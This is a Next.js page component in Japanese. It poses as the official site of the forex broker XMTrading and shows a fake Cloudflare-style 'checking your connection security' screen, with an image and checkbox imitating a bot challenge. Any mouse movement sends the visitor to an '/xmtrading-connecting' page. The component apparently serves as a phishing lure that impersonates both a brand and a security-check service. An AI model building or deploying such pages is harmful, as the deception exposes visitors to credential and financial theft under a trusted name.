'use client'
import styles from "./page.module.css";
import circel from "../../public/R-tron.png";
import image from "../../public/image.png";
import Image from "next/image";

export default function Home() {

  const handleClick = () => {
      window.location.href = "/xmtrading-connecting"; 
  }

  return (
    <div
      onMouseMove={handleClick}
      // onClick={handleClick}
      // onTouchMove={handleClick}
    >
      <main className={styles.main}>
        <h3 className={styles.text}>
          XMTrading™ - (エックスエム) 公式サイト{" "}
          <span
            style={{ transform: "translate(0px)", display: "inline-block" }}
          >
            <Image src={circel} alt="Logo" width={30} height={30} priority />
          </span>
        </h3>
        <p className={styles.text2}>
          サイトの接続が安全か確認しています
        </p>
        <p className={styles.text3}>
          続行する前に接続のセキュリティを確認する必要があります。
          XMTrading™ - (エックスエム)
        </p>
       
        <div style={{ marginTop: 30, position: "relative" }}>
          <Image src={image} alt="Logo" className={styles.image2} />
          <input type="checkbox" className={styles.checkbox} />
        </div>
        <p className={styles.text4}>なぜこのページが表示されているのですか？</p>
        <p className={styles.text5}>
        悪意のあるボットからのリクエストが正規のトラフィックのように見えることがあります。サイトが接続のセキュリティを確認している間に、このページが表示されることがあります。
        </p>
      </main>
    </div>
  );
}
